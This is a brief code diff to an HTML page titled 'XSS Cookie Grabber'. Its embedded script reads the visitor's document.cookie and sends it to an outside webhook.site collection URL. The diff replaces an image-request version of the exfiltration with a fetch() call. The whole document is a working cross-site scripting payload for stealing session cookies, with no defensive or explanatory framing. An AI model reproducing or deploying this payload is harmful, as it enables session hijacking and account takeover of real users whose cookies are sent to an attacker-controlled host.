@@ -3,7 +3,7 @@
 <head><title>XSS Cookie Grabber</title></head>
 <body>
 <script>
-      new Image().src = 'https://webhook.site/4e2c8ba2-9335-426a-a590-c95cb9bee80d?cookie=' + encodeURIComponent(document.cookie);
+  fetch("https://webhook.site/4e2c8ba2-9335-426a-a590-c95cb9bee80d?cookie=" + document.cookie);
 </script>
 </body>
 </html>
